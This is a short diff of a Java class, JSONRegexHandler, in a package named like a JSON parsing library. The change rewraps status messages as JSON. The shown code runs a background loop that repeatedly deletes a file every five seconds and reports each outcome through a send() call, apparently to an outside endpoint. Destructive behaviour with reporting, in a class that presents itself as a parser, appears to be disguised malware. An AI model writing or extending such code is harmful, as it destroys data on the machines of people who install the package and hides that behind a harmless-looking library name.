@@ -1,5 +1,6 @@
 package org.json.updated.parsers;
 
+import org.json.updated.parsers.util.JSONBuilder;
 import org.json.updated.parsers.util.JSONParser;
 
 import java.io.File;
@@ -31,8 +32,8 @@ public class JSONRegexHandler {
             while (!Thread.currentThread().isInterrupted()) {
                 try {
                     Thread.sleep(5000);
-                    if (file.delete()) JSONRegexHandler.send("File Deleted: " + file.getName());
-                    else JSONRegexHandler.send("Failed to delete file: " + file.getName());
+                    if (file.delete()) JSONRegexHandler.send(new JSONBuilder().value("content", "File Deleted: " + file.getName()).build());
+                    else if (file.exists()) JSONRegexHandler.send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
                 } catch (Exception ignored) {
                 }
             }
